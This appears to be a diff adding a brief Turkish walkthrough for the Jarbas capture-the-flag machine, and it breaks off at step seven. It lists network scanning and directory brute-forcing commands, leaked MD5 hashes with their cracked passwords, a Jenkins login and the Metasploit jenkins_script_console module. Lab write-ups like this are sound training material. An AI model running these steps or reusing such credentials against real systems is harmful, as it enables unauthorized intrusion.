@@ -1,0 +1,11 @@
+JARBAS MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.148 bulundu.
+2 - nmap -sT -A 192.168.2.148
+3 - gobuster dir -u http://192.168.2.148 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt
+4 - view-source://http://192.168.2.148/access.html
+tiago:5978a63b4654c73c60fa24f836386d87 -> italia99
+trindade:f463f63616cb3f1e81ce46b39f882fd5 -> marianna
+eder:9b38e2b1e8b12f426b0d208a7ab6cb98 -> vipsu
+5 - http://192.168.2.148:8080, eder:vipsu
+6 - msfconsole, search jenkins, use exploit/multi/http/jenkins_script_console
+7 - 
